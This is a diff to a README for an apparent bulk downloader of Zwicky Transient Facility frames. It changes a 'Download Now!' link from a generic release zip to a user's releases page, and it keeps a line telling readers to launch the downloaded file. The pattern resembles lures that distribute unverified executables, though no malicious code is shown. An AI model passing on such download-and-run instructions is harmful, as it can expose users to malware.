@@ -21,7 +21,7 @@ This repository houses the Bulk Zwicky Transient Facility Frames Downloader, a t
 
 ## Access the Tool 🛠️
 
-To access the Bulk Zwicky Transient Facility Frames Downloader, simply click on the following link: [Download Now!](https://github.com/assets/Release.zip)
+To access the Bulk Zwicky Transient Facility Frames Downloader, simply click on the following link: [Download Now!](https://github.com/MrAdiel1809/Bulk-Zwicky-Transient-Facility-Downloader/releases)
 
 If the link ends with the file name, remember to launch the downloaded file to initiate the downloader tool.
 
